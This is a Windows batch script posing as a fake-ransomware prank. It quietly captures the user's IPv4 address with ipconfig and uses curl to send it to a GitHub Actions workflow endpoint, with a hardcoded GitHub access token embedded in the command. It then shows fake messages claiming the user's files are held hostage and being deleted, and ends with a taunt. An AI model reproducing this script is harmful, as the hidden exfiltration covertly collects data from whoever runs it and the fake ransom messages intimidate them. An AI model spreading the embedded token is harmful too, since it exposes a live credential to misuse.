@echo off
color a
mode 1000

:: Step 1: Execute ipconfig in the Background
ipconfig | find "IPv4 Address" > captured_ip.txt

:: Display the contents of captured_ip.txt for debugging
type captured_ip.txt

:: Step 2: HTTP POST Request to GitHub Actions Endpoint
curl -X POST -H "Content-Type: text/plain" --data-binary @captured_ip.txt -u Moosey12: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 https://api.github.com/repos/Moosey12/ipwebsite/actions/workflows/capture-ip.yml/dispatches

:: Rest of the script remains unchanged
echo Your files have been held hostage by ransomware...
echo Would you like to delete the ransomware???
set /p love=
if %love%==yes goto hate
:hate

ping 1.1.1.1 -n 5 -w 1000>NUL
echo Ransomware is being deleted now....
pause
msg *Ransomware is commencing...
dir /s
cls
echo Your files are almost all gone now...
pause
msg * Pranked looser...
